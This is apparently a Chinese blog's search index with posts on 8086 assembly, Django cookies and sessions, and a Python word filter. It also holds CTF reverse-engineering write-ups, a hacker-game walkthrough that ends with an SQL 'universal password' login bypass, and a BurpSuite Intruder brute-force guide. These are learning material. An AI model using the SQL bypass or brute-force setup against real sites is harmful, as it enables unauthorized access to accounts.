    <content type="text"><![CDATA[寄存器（内存访问）内存中字的存储 DS和[address] 8086CPU中有一个DS寄存器，通常用来存放要访问数据的地址段 [address]表示一个内存单元，address表示内存单元的偏移地址 如果要读取10000H单元的内容，可以用如下的程序段进行 mov bx,1000H mov ds,bx mov al,[0] 上面的3条指令将10000H（1000：0）中的数据读到al中 字的传送mov bx,1000H mov ds,bx mov ax,[0] ;1000:0处的数据送入ax mov [0],cx ;cx中的16位数据送到1000:0处 问题1 问题2 问题3 检测点3.1(1)在Debug 中，用”d 0:0 1f” 查看内存，结果如下： 0000:0000 70 80 F0 30 EF 60 30 E2-00 80 80 12 66 20 22 60 0000:0010 62 26 E6 D6 CC 2E 3C 3B-AB BA 00 00 26 06 66 88 下面的程序执行前，AX=0,BX=0，写出每条汇编指令执行完毕后相关寄存器中的值： Mov ax,1 Mov ds,ax Mov ax,[0000] AX=2662 Mov bx,[0001] BX=E626 Mov ax,bx AX=E626 Mov ax,[0000] AX=2662 Mov bx,[0002] BX=D6E6 Add ax,bx AX=FD48 Add ax,[0004] AX=2C14 Mov ax,0 AX=0 Mov al,[0002] AX=00E6 Mov bx,0 BX=0 Mov bl,[000C] BX=0026 Add al,bl AX=000C (2) mov ax,6622H CS=2000H IP=0002H jmp 0ff0:0100 CS=0ff0H IP=0100H 物理地址=CS*16+IP=10000H mov ax,2000H CS=0ff0H IP=0103H mov ds,ax CS=0ff0H IP=0105H mov ax,[0008] CS=0ff0H IP=0108H mov ax,[0002] CS=0ff0H Ip=010BH 第一步：CS=2000H，IP=0H 地址：20000H 读取第一条指令 mov ax,6622H CS=2000H, IP=03H 执行指令 mov ax,6622H 执行结果：AX=6622H 第二步：地址：20003H 读取第二条指令 jmp 0ff0:0100 CS=2000H,IP=03H 执行指令：jmp 0ff0:0100 执行结果：CS=0ff0H, IP=0100H 第三步：地址：CSx16+IP = 10000H 读取指令：mov ax,2000H CS=0ff0H, IP=0103H 执行指令：mov ax,2000H 执行结果：AX=2000H 第四步：地址：10003H 读取指令：mov ds,ax CS=0ff0H, IP=0105H 执行指令：mov ds,ax 执行结果：ds=2000H 第五步：地址：10005H 读取指令：mov ax,[0008] CS=0ff0H，IP=10008H，DS=2000H 执行指令：mov ax,[0008] ; 也就是将地址【DS：IP】为 2000H：0008H的值移动到AX 执行结果：AX=C189H 第六步：读取指令：mov ax,[0002] CS=0ff0H ,IP=1000BH,DS=2000H 执行指令：mov ax,[0002] 执行结果：AX=EA66 知识点： 任意时刻SS:SP 指向栈顶元素。 push指令和pop指令执行时，CPU从 SS和SP中得到栈顶的地址。 注：SS(Stack Segmet)堆栈段寄存器，指向当前的堆栈段。 SP(Stack Pointer)堆栈指针寄存器，主要用于堆栈操作，存放堆栈段首地 址到栈顶单元的偏移量。 入栈时：886CPU栈顶从高地址向低地址方向增长。 CPU提供的栈机制CS、IP中存放着当前指令的段地址和偏移地址，而段寄存器SS和寄存器SP为CPU的入栈，出栈服务。任意时刻SS：SP指向栈顶元素。 问题1如果将10000H~1000Fh这段空间当作栈，初始空间是空的，此时，SS=1000H，SP=0010H 问题2利用栈，交换AX和BX中的数据 mov ax,1000H mov ss,ax mov sp,0010H ;初始化栈顶 mov ax=001AH mov bx=001BH push ax push bx pop ax ；当前栈顶的数据是bx中的欲来的数据，所以先pop ax，即ax=001BH pop bx ；执行pop ax后，栈顶的数据为ax原来的数据，所以再pop bx，即bx=001AH 问题3利用栈在10000H处写入数据2266H mov ax,1000H mov ss,ax mov sp,0002H mov ax,2266H push ax 一般写法 mov ax,1000H mov ds,ax mov ax,2266H mov [0],ax]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[寄存器]]></title>
    <url>%2F2018%2F09%2F07%2F%E5%AF%84%E5%AD%98%E5%99%A8%2F</url>
    <content type="text"><![CDATA[寄存器 一个典型的CPU有运算器、控制器、寄存器等器件构成 寄存器是CPU中程序员可以用执行读写的部件。程序员通过改变各种寄存器中的内容来实现对CPU的控制 不同的CPU，寄存器的个数、结构是不同的。8086CPU有14个寄存器，每个寄存器有一个名称。这些寄存器是：AX、BX、CX、DX、SI、DI、SP、BP、IP、CS、SS、DS、ES、PWS、 通用寄存器 8086CPU的的所有寄存器都是16位的，可以存放两个字节，AX、BX、CX、DX、这四个寄存器位通用寄存器 一个16位的寄存器可以存储一个16位的数据，所能存储的数据最大值为2^16-1，或用16进制表示为FFFFH，也为10000H-1 AX的低8位构成了AL寄存器，高8位构成了AH寄存器，AH和AL寄存器是可以独立使用的 字在寄存器中的存储 一个16位的寄存器可以存放两个字节（byte），即为一个字（word），一个字等于两个字节 而计算机的存储单元为字节（byte），一个内存（存储）单元可以存放8位数据（bit），也就是说，计算机中的数据大多是由1~N个8位数据构成。 很多时候，用16进制表示数据可以直观的看出数据是由哪些8位数据构成，如2000写成4E20，可以看出是由4E和20两个8位数据构成的，如果AX中存放4E20H，则AH里是4E，AL里是20mov和add汇编指令原AX，BX中的值：0000H，0000H问题2.1在执行前ax和bx中的数据都为8226H，相加后所得值为：1044CH，但ax为16位寄存器，只能存放4位十六进制的数据，所以最高位的1不能在ax中保存，，ax中的数据为：044CH问题2.2在执行前，al中的数据为C5H，相加后所得的值为：158H，但是al为8位寄存器，只能诚邀您放两位16精致的数据，所以最高位的1丢失，ax中的数据为：0058H检测点2.1： (1)写出每条汇编指令执行后相关寄存器中的值。 mov ax,62627 AX= F4A3H mov ah,31H AX=31A3H mov al,23H AX=3123H add ax,ax AX=6246H mov bx,826CH BX=826CH mov cx,ax CX=6246H mov ax,bx AX=826CH add ax,bx AX=04D8H mov al,bh AX=0482H mov ah,bl AX=6C82H add ah,ah AX=D882H add al,6 AX=D888H add al,al AX=D810H mov ax,cx AX=6246H (2)只能使用目前学过的汇编指令，最多使用4条指令，计算2的4次方. mov ax,2h add ax,ax add ax,ax add ax,ax 物理地址 段地址*16+偏移地址=物理地址的本质含义CPU在访问内存时，用一个基础地址（段地址*16）和一个相对于基础地址的偏移地址相加，给出内存单元的物理地址 检测点2.2（1）给定段地址为0001H，仅通过变化偏移地址寻址，CPU的寻址范围为多少到多少？ 答：物理地址=SA*16+EA EA的变化范围为0H~FFFFH 物理地址范围为（SA16+0H）~（SA16+FFFFH） 现在SA=0001H，那么寻址范围为 （0001H16+0H）~（0001H16+FFFFH）=00010H~1000FH （2）有一数据存放在内存20000H单元中，现给定段地址为SA，若想用偏移地址寻到此单元。则SA应满足的条件是：最小为多少？最大为多少？ 答： 物理地址 20000H ＝ SA * 10H ＋ 偏移地址 显然，偏移地址应该取最大值，SA 才能达到最小。 那么，偏移地址取最大值：FFFFH，行吗？ 代入上述方程，发现，两边的，最末位，不相等。 偏移地址最大值，只能取到：FFF0H，方程才有可能成立。 按照公式： 物理地址 ＝ SA * 10H ＋ 偏移地址 可知，物理地址、偏移地址，两者的最低位，必定是相同的。 当物理地址＝20000H，偏移地址也只能是：XXX0H，取最大就是 FFF0H。 于是：SA = (20000H － FFF0H) / 16＝10010H / 16 ＝ 1001H。 标记：王爽汇编语言，段地址*16+偏移地址=物理地址，其中16是十进制。 提示，反过来思考一下，当段地址给定为多少，CPU无论怎么变化偏移地址都无法寻到20000H单元？ 答： 先求出，段地址为多少的时候，变化偏移地址可找到20000H地址单元。 段地址 × 16 + 偏移地址 = 20000H 偏移地址=0000H，段地址则为 2000H； 偏移地址=FFF0H，段地址则为 1001H。 那么，当段地址大于 2000H，或小于 1001H，就不能找到 20000H。 CS和IPCS和IP是8086CPU中最为关键的寄存器，CS为代码段寄存器（存放段地址），IP为指令指针寄存器（存放偏移地址） 1、 汇编指令由操作码和操作数组成 如：mov ax,0 mov为操作数 表示指令的功能（是传送指令） ax,0是2个操作数 即0（0000H）为源操作数 ax为目的操作数 该指令就是 将源操作数传送给目的操作数 从ax可以看出是一条16位的传送指令2、 mov ax,0在内存中的机器指令是B8 00 00 B8 是操作码 表示是一条以ax为目的操作数的传送指令（操作数ax为寄存器寻址 隐含在操作码 中，00 00 表示的是一个16位的立即数即0000H 低8位在前 高8位在后。3、汇编指令在内存中 就是以B8 00 00机器指令表示的二进制代码。 问题2.3 检测点下面的3条指令执行后，cpu几次修改IP？都是在什么时候？最后IP中的值是多少？ mov ax,bx sub ax,ax jmp ax 注：mov ax,bx (高级编程语言就是ax=bx ) sub ax,ax (高级编程语言就是ax=ax-ax 发现ax=0H) jmp ax (偏移增量为ax,进而IP=IP+ax，即加上索引的字节数） 一共修改四次 第一次：读取mov ax,bx之后 第二次：读取sub ax,ax之后 第三次：读取jmp ax之后 第四次：执行jmp ax修改IP 最后IP的值为0000H，因为最后ax中的值为0000H，所以IP中的值也为0000H]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cpu与存储器]]></title>
    <url>%2F2018%2F09%2F07%2Fcpu%2F</url>
    <content type="text"><![CDATA[cpu中央处理器（CPU，Central Processing Unit）是一块超大规模的集成电路，是一台计算机的运算核心（Core）和控制核心（ Control Unit）。它的功能主要是解释计算机指令以及处理计算机软件中的数据。中央处理器主要包括运算器（算术逻辑运算单元，ALU，Arithmetic Logic Unit）和高速缓冲存储器（Cache）及实现它们之间联系的数据（Data）、控制及状态的总线（Bus）。它与内部存储器（Memory）和输入/输出（I/O）设备合称为电子计算机三大核心部件。 物理结构CPU包括运算逻辑部件、寄存器部件和控制部件等。 逻辑部件运算逻辑部件。可以执行定点或浮点算术运算操作、移位操作以及逻辑操作，也可执行地址运算和转换。 寄存器寄存器部件，包括寄存器、专用寄存器和控制寄存器。 通用寄存器又可分定点数和浮点数两类，它们用来保存指令执行过程中临时存放的寄存器操作数和中间（或最终）的操作结果。 通用寄存器是中央处理器的重要部件之一。 工作过程CPU从存储器或高速缓冲存储器中取出指令，放入指令寄存器，并对指令译码。它把指令分解成一系列的微操作，然后发出各种控制命令，执行微操作系列，从而完成一条指令的执行。指令是计算机规定执行操作的类型和操作数的基本命令。指令是由一个字节或者多个字节组成，其中包括操作码字段、一个或多个有关操作数地址的字段以及一些表征机器状态的状态字以及特征码。有的指令中也直接包含操作数本身。 存储器CPU是计算机的核心部件，要想让一个CPU工作，就必须向它提供指令和数据。而指令和数据在存储器中存放，也就是我们平时说的内存。 存储单元 存储器被划分若干个存储单元，每个存储单元从0开始循序编号 这些编号可以看作存储单元在存储器中的地址 一个存储单元可以存储一个Byte，即8个二进制位（bit） CPU对存储器的读写 CPU通过地址线将地址信息3发出 CPU通过控制线发出内存读命令，选中存储器芯片，并通知它，将要从中读取数据 存储器将三号单元中的数据8通过数据线送入CPU。写操作与读操作的步骤相似。如向3号单元写入数据26 地址总线 若一个CPU有N根地址总线，也就是说这个CPU的地址总线的宽度为N，这样的CPU最多可以寻找2的N次方个内存单位 数据总线 数据总线的宽度决定了CPU和外界的数据传送速度。8根数据总线 一次可传送一个8位二进制数据（即一个字节）。16根数据总线一次可传送两个字节 8088CPU的数据总线宽度为8,8086CPU的为16 控制总线 CPU对外部器件的控制是通过控制总线来进行的 控制总线的跨度决定了CPU对外部器件的控制能力 检测点1.1 一个CPU的寻址能力为8KB，那么他的地址总线宽度为13。2^n=1024*8n为总线宽度。已知2^10 = 1024因此n=13 1KB的存储器有1024个存储单元。存储单元的编号从0到1023 。2^10=1KB=1024 1KB的存储器可以存储 8192个bit, 1024 个Byte。1Byte=8bit 1GB、1MB、1KB分别是2^30 Byte,2^20 Byte,2^10 Byte。102410241024=2^301024*1024=2^201024=2^10 8080、8088、80286、80386的地址总线宽度分别为16根、20根、24根、32根，则他们的寻址能力分别为： 64 （KB）、 1 （MB）、 16 （MB）、 4 （GB）。2^10=1K 2^6=642^20=1M2^4=162^30=1G 2^2=4 8080、8088、8086、80286、80386的数据总线宽度分别为8根、8根、16根、16根、32根。则它们一次可以传送的数据为： 1 （B）、 1 （B）、 2 （B）、 2 （B） 4 （B）。1Byte=8bit每8根总线一次最多可传递一字节数据。 从内存中读取1024字节的数据，8086至少要读 512 次，80386至少要读 256 次。8086每次读2字节数据80386每次读4字节数据 在存储器中，数据和程序以 二进制 形式存放。数据与程序在存储器中以无差别的二进制数据形式存放 存储器芯片 一台PC机上，装有多个存储器芯片，从读写属性上看分为两类：随机存储器（RAM）和只读存储器（ROM） 随机存储器用于放供CPU使用的绝大部分程序和数据 内存地址空间 所有的物理存储器被看作一个由若干存储单元组成的的逻辑存储器 每个物理存储器在这个逻辑存储器中占有一个地址段，即一段地址空间 CPU在这段地址空间中读写数据，实际上就是在相对于的物理存储器中读写数据]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cookie和Session]]></title>
    <url>%2F2018%2F08%2F09%2FCookie%E5%92%8CSession%2F</url>
    <content type="text"><![CDATA[1、Cookie介绍 Cookie是由服务器端生成，发送给User-Agent（一般是浏览器），浏览器会将Cookie的key/value保存到某个目录下的文本文件内，下次请求同一网站时就发送该Cookie给服务器（前提是浏览器设置为启用cookie）。Cookie名称和值可以由服务器端开发自己定义，这样服务器可以知道该用户是否是合法用户以及是否需要重新登录等，服务器可以设置或读取Cookies中包含信息，借此维护用户跟服务器会话中的状态。 简单来说，Cookie 是保存在浏览器的一个键值对，每次的HTTP请求都会携带 Cookie 。 cookie的作用 服务器可以利用Cookies包含信息的任意性来筛选并经常性维护这些信息，以判断在HTTP传输中的状态。Cookies最典型的应用是判定注册用户是否已经登录网站，用户可能会得到提示，是否在下一次进入此网站时保留用户信息以便简化登录手续，这些都是Cookies的功用。另一个重要应用场合是“购物车”之类处理。用户可能会在一段时间内在同一家网站的不同页面中选择不同的商品，这些信息都会写入Cookies，以便在最后付款时提取信息。 Django框架的下cookie1、 获取Cookie： 获取已经设置好的cookies极其简单。 每一个HttpRequest 对象都有一个COOKIES 对象，该对象的行为类似一个字典，你可以使用它读取任何浏览器发送给视图（view）的cookies。 获取普通cookie request.COOKIES[&apos;key&apos;] request.COOKIES.get(&apos;key&apos;) 解密带签名的cookie request.get_signed_cookie(key, default=RAISE_ERROR, salt=&apos;&apos;, max_age=None) 参数： default: 默认值 salt: 加密盐 max_age: 后台控制过期时间 2、设置Cookie：rep = HttpResponse(...) 或 rep ＝ render(request, ...) #设置cookie需要使用 HttpResponse对象的 set_cookie()方法 #设置普通cookie rep.set_cookie(key,value,...) #设置带签名的cookie rep.set_signed_cookie(key,value,salt=&apos;加密盐&apos;,...) #参数： key, 键 value=&apos;&apos;, 值 max_age=None, 超时时间 expires=None, 超时时间(IE requires expires, so set it if hasn&apos;t been already.) path=&apos;/&apos;, Cookie生效的路径，/ 表示根路径，特殊的：跟路径的cookie可以被任何url的页面访问 domain=None, Cookie生效的域名 secure=False, https传输 httponly=False 只能http协议传输，无法被JavaScript获取（不是绝对，底层抓包可以获取到也可以被覆盖） 由于cookie保存在客户端的电脑上，所以，JavaScript和jquery也可以操作cookie。 &lt;script src=&apos;/static/js/jquery.cookie.js&apos;&gt;&lt;/script&gt; $.cookie(&quot;list_pager_num&quot;, 30,{ path: &apos;/&apos; }); 注意： Cookie(特别是那些没通过HTTPS传输的)是非常不安全的。 因为HTTP数据是以明文发送的，所以 特别容易受到嗅探攻击。 也就是说，嗅探攻击者可以在网络中拦截并读取cookies，因此你要 绝对避免在cookies中存储敏感信息。 这就意味着您不应该使用cookie来在存储任何敏感信息。 因此不能在cookies中存储可能会被篡改的敏感数据。 在cookies中存储 IsLoggedIn=1 ，以标识用户已经登录。 犯这类错误的站点数量多的令人难以置信； 绕过这些网站的安全系统也是易如反掌。 2、Session1、介绍 在WEB开发中，服务器可以为每个用户浏览器创建一个会话对象（session对象），注意：一个浏览器独占一个session对象(默认情况下)。因此，在需要保存用户数据时，服务器程序可以把用户数据写到用户浏览器独占的session中，当用户使用浏览器访问其它程序时，其它程序可以从用户的session中取出该用户的数据，为用户服务。 Session与Cookie的区别： Session是在服务端保存的一个数据结构，用来跟踪用户的状态，这个数据可以保存在集群、数据库、文件中。 Cookie是客户端保存用户信息的一种机制，用来记录用户的一些信息，也是实现Session的一种方式。 Session 必须要依赖 Cookie ，因为 Cookie的值就等于 Session 的Key ###Session的工作原理: 当用户第一次访问时，服务器会给其创建一个session，并且把session的Id(本质是随机字符串)以cookie的形式发送给客户端浏览器，下次再去访问服务器时，客户机浏览器会把存储到cookie中的session的Id一起传递到服务器端，服务器发现客户机浏览器带session id过来了，就会使用内存中与之对应的session为之服务 2、Django下的 Session 框架 由于存在的限制与安全漏洞，cookies和持续性会话已经成为Web开发中令人头疼的典范。 好消息是，Django的目标正是高效的“头疼杀手”，它自带的session框架会帮你搞定这些问题。 你可以用session 框架来存取每个访问者任意数据， 这些数据在服务器端存储，并对cookie的收发进行了抽象。 Cookies只存储数据的哈希会话ID，而不是数据本身，从而避免了大部分的常见cookie问题。 Django中默认支持Session，其内部提供了5种类型的Session供开发者使用： 数据库（默认） 缓存 文件 缓存+数据库 加密cookie]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[黑客游戏]]></title>
    <url>%2F2018%2F08%2F07%2F%E9%BB%91%E5%AE%A2%E6%B8%B8%E6%88%8F%2F</url>
    <content type="text"><![CDATA[第一关网址：http://www.cn-hack.cn/qs/5.htm 进来可以看到要求输入密码进入下一关，可以先看下页面源代码发现下一关的网址，如图： 那就进入http://www.cn-hack.cn/qs/2sdfadf.htm来到第二关 第二关是一张图片，提示密码在图片中，那就把图片下载下来，改为txt文档，打开看看，发现第三关的网址，如图： 进入第三关的网址http://www.cn-hack.cn/qs/or3.htm 第三关就直接给出密码：%68%74%74%70%3A%2F%2F%77%77%77%2E%63%6E%2D%68%61%63%6B%2E%63%6E%2F%71%73%2F%34%64%66%73%61%2E%68%74%6D ，不过是经过URL加密过的，进行URL解密得到网址：http://www.cn-hack.cn/qs/4dfsa.htm 进入第四关http://www.cn-hack.cn/qs/4dfsa.htm 需要输入用户名和密码，先看看页面源代码，没发现什么，那就随便输入用户名和密码，然后跳转到一个页面，那就在看看源代码， 发现第五关的地址进入第五关http://www.cn-hack.cn/qs/789.htm 进来就让你输入通用密码中的两个字母，想看页面源代码也看不了，上网搜搜SQL通用密码，知道了密码为 or ,输入进去就通关了]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python替换敏感词]]></title>
    <url>%2F2018%2F07%2F31%2Fpython%E6%9B%BF%E6%8D%A2%E6%95%8F%E6%84%9F%E8%AF%8D%2F</url>
    <content type="text"><![CDATA[思路如下: 首先，从敏感词文件中读取到敏感词汇，放入容器中 如果有标点符号，则把一些没用的标点符号去掉 然后，获取用户输入，判断输入是否包含敏感词汇， 并输出相对应的结果 1234567891011121314151617181920212223242526272829303132333435import osdef filter_words(path): if os.path.isfile(path): with open(path, &apos;r&apos;) as f: words = f.read() words = words.replace(&apos;，&apos;, &apos;&apos;) words = words.replace(&apos;\n&apos;, &apos;&apos;) return wordsdef sense_words(): words = filter_words(&apos;filter.txt&apos;) print(&quot;敏感字内容如下:&quot;) print(&quot;------------------------------------------------------------------&quot;) print(words) print(&quot;------------------------------------------------------------------&quot;) while True: sentence = input(&quot;请输入：&quot;) if sentence == &apos;0&apos;: print(&apos;exit&apos;) break for i in words: if i in sentence: replace = &apos;&apos; for j in range(len(i)): replace = replace + &apos;*&apos; sentence = sentence.replace(i, replace) print(sentence)if __name__ == &quot;__main__&quot;: sense_words()]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[南邮ctf-PY交易]]></title>
    <url>%2F2018%2F07%2F27%2F%E5%8D%97%E9%82%AEctf-PY%E4%BA%A4%E6%98%93%2F</url>
    <content type="text"><![CDATA[下载后是一个pyc文件 选择https://tool.lu/pyc/ 进行解密 如下： 只是一个简单的base64加密，得到的py脚本如下： import base64 c = &apos;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&apos; m = c.decode(&quot;base64&quot;) s = &apos;&apos; for i in m: x = ord(i) - 16 x = x ^ 32 s=s+chr(x) print s 只能在python2.X下运行 得到flag：nctf{d3c0mpil1n9_PyC}]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[南邮攻防训练平台逆向第四题WxyVM1]]></title>
    <url>%2F2018%2F07%2F27%2FWxyVM1%2F</url>
    <content type="text"><![CDATA[下载文件elf文件，运行输入flag，用ida打开逆向算法： 不是很复杂，可以看出flag长度需要24，最终会和已给出dword_601060进行比较，一致则成功，那么现在只需要看上面的sub_4005B6()函数了： 跟进两个地址进去看一下，发现有已经给出的处理所需数据，只是比较多，有15000个，想了想最后还是决定把数据提出来（其实是没其他办法了==） 最后是逆推py脚本： 那个15000的数组太长了，不好复制，要导出在一个文档里，才能复制完 tmp=[1, 16, 37, 3, 13, 10, 2, 11, 40, 2 ] //太长了只写前十个 final=[196, 52, 34, 177, 211, 17, 151, 7, 219, 55, 196, 6, 29, 252, 91, 237, 152, 223, 148, 216, 179, 132, 204, 8] i = 14997 while i&gt;0: v0 = tmp[i] v3 = tmp[i+2] result = tmp[i+1] if v0 == 1: final[result] -= v3 elif v0 == 2: final[result] += v3 elif v0 == 3: final[result] ^= v3 elif v0 == 4: final[result] /= v3! elif v0 == 5: final[result] ^= final[v3] final[result]&amp;=0xFF //需要注意的地方，因为ascii字符码范围为0~127，可能发生越界 i -= 3 for x in final: print(chr(x), end = &apos;&apos;) 得到flag：nctf{Embr4ce_Vm_j0in_R3} 如果不加final[result]&amp;=0xFF 这句话就会越界，如图： &amp;0xFF到底是什么意思 举个简单的例子: byte[] b = new byte[5]; b[0] = -12; byte 8位二进制 = 1个字节 char 2个字节 short (2个字节) int（4个字节） long（8个字节） float （4个字节） double（8个字节） 计算机存储数据机制：正数存储的二进制原码,负数存储的是二进制的补码。 补码是负数的绝对值反码加1。 比如-12，-12 的绝对值原码是：0000 1100 取反： 1111 0011 加1： 1111 0100 byte –&gt; int 就是由8位变 32 位 高24位全部补1： 1111 1111 1111 1111 1111 1111 1111 0100 ; 0xFF 是计算机十六进制的表示： 0x就是代表十六进制，A B C D E F 分别代表10 11 12 13 14 15 F就是15 一个F 代表4位二进制：可以看做 是 8 4 2 1。 0xFF的二进制表示就是：1111 1111。 高24位补0：0000 0000 0000 0000 0000 0000 1111 1111; -12的补码与0xFF 进行与（&amp;）操作 最后就是0000 0000 0000 0000 0000 0000 1111 0100 转换为十进制就是 244。 byte类型的数字要&amp;0xff再赋值给int类型，其本质原因就是想保持二进制补码的一致性。 当byte要转化为int的时候，高的24位必然会补1，这样，其二进制补码其实已经不一致了，&amp;0xff可以将高的24位置为0，低8位保持原样。这样做的目的就是为了保证二进制数据的一致性。 有人问为什么上面的式子中b[0]不是8位而是32位，因为当系统检测到byte可能会转化成int或者说byte与int类型进行运算的时候，就会将byte的内存空间高位补1（也就是按符号位补位）扩充到32位，再参与运算。]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BurpSuite系列----Intruder模块(暴力破解口令)]]></title>
    <url>%2F2018%2F07%2F27%2FBurpSuit%20%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%8F%A3%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[一、简介 Burp Intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击，Burp Intruder 是高度可配置的，并被用来在广范围内进行自动化攻击。你可以使用 Burp Intruder 方便地执行许多任务，包括枚举标识符，获取有用数据，漏洞模糊测试。合适的攻击类型取决于应用程序的情况，可能包括：缺陷测试：SQL 注入，跨站点脚本，缓冲区溢出，路径遍历；暴力攻击认证系统；枚举；操纵参数；拖出隐藏的内容和功能；会话令牌测序和会话劫持；数据挖掘；并发攻击；应用层的拒绝服务式攻击。 二、模块说明 Burp Intruder主要有四个模块组成:1：Target 用于配置目标服务器进行攻击的详细信息。2：Positions 设置Payloads的插入点以及攻击类型（攻击模式）。3：Payloads 设置payload，配置字典4：Opetions 此选项卡包含了request headers，request engine，attack results ，grep match，grep_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。 1：Target 目标选项(Target tab)这个选项是用来配置目标服务器的细节： 2：Positions 位置选项(Positions tab)这个选项是用来配置在攻击里产生的所有 HTTP 请求的模板： 使用一对§字符来标记出有效负荷的位置，在这两个符号直接包含了模板文本的内容。当把一个有效负荷放置到一个给出的请求的特殊位置上时，就把这§符号放到这个位置，然后在两个符号之间的出现的文本都会被有效负荷替换。当有个特殊位置没有为一个给出的请求安排有效负荷时(这只适用”sniper”攻击类型)，那个位置的§字符会被删除，出现在它们之间的文本不会变化。 当使用 Burp Suite 发送一个其他地方的请求时，Burp Intruder 会对你最想放置有效负荷的位置做一个最好的猜测，并且它把这些放置在每个 URL 和主体参数的值里，以及每个cookie 里。每个标记和它中间的文本都会被加亮以显得更清晰。你可以使用 Intruder 菜单上的选项标记的位置是要替换还是附加现有的参数值。在上面的请求编辑器里，指出了定义位置的数量和文本模板的大小。 你可以使用选项上的按钮来控制位置上的标记： add § — 在当前光标位置插入一个位置标记。 clear § — 删除整个模板或选中的部分模板里的位置标记。 auto § — 这会对放置标记的位置做一个猜测，放哪里会有用，然后就把标记放到相应位置。这是一个为攻击常规漏洞(SQL 注入)快速标记出合适位置的有用的功能，然后人工标记是为自定义攻击的。4.refresh — 如果需要，可以刷新编辑器里有颜色的代码。5.clear — 删除整个编辑器内容。 3：Payloads 有效负荷选项(Payloads tab)这个选项是用来配置一个或多个有效负荷的集合。如果定义了”cluster bomb”和”pitchfork”攻击类型，然后必须为每定义的有效负荷位置(最多8个)配置一个单独的有效负荷。使用”payload set”下拉菜单选择要配置的有效负荷。 选项1：Payload Sets Payload数量类型设置 选项2：Payload Opetions[Simple list] 该选项会根据选项1中Payload type的设置而改变 选项3：Payload Processing 对生成的Payload进行编码、加密、截取等操作 选项4：Payload Encoding 你可以配置哪些有效载荷中的字符应该是URL编码的HTTP请求中的安全传输。任何已配置的URL编码最后应用，任何有效载荷处理规则执行之后。 这是推荐使用此设置进行最终URL编码，而不是一个有效载荷处理规则，因为可以用来有效载荷的grep选项来检查响应为呼应有效载荷的最终URL编码应用之前。 4：Opetions 选项卡(Options tab) 此选项卡包含了request headers，request engine，attack results ，grep match，grep_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。 选项1：Request Headers 这些设置控制在Intruder是否更新配置请求头。 如果选中‘update Content-Length header’框，Burp Intruder 会使用每个请求的 HTTP 主体长度的正确值，添加或更新这个请求里 HTTP 消息头的内容长度。这个功能对一些需要把可变长度的有效载荷插入到 HTTP 请求模板主体的攻击是很有必要的。这个 HTTP 规范和大多数 web 服务器一样，需要使用消息头内容长度来指定 HTTP 主体长度的正确值。如果没有指定正确值，目标服务器会返回一个错误，也可能返回一个未完成的请求，也可能无限期地等待接收请求里的进一步数据。 如果选中‘set Connection: close’框，则 Burp Intruder 会添加或更新 HTTP 消息头的连接来请求在每个请求后已关闭的连接。在多数情况下，这个选项会让攻击执行得更快。 选项2：Request Engine 设置发送请求的线程、超时重试等。 选项3：Attack Results 设置攻击结果的显示。 选项4：Grep - Match 在响应中找出存在指定的内容的一项。 选项5：Grep - Extract 通过正则提取返回信息中的内容。 选项6：Grep - Payloads 这些设置可以用于包含已提交的有效负载的反射的标志结果项目。如果启用了此选项，BurpSuite会添加包含一个复选框指示当前负载的值在每个响应发现新的结果列。 选项7：Redirections 重定向响应，控制Burp在进行攻击时如何处理重定向。]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
</search>
